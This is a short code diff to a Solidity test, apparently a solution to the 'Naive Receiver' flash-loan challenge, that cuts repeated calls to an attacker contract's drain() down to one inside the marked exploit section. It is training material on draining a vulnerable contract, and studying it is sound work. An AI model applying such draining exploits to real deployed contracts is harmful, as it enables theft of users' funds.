@@ -62,15 +62,6 @@ contract NaiveReceiver is DSTest {
             address(flashLoanReceiver)
         );
         naiveReceiverAttacker.drain();
-        naiveReceiverAttacker.drain();
-        naiveReceiverAttacker.drain();
-        naiveReceiverAttacker.drain();
-        naiveReceiverAttacker.drain();
-        naiveReceiverAttacker.drain();
-        naiveReceiverAttacker.drain();
-        naiveReceiverAttacker.drain();
-        naiveReceiverAttacker.drain();
-        naiveReceiverAttacker.drain();
         vm.stopPrank();
 
         /** EXPLOIT END **/
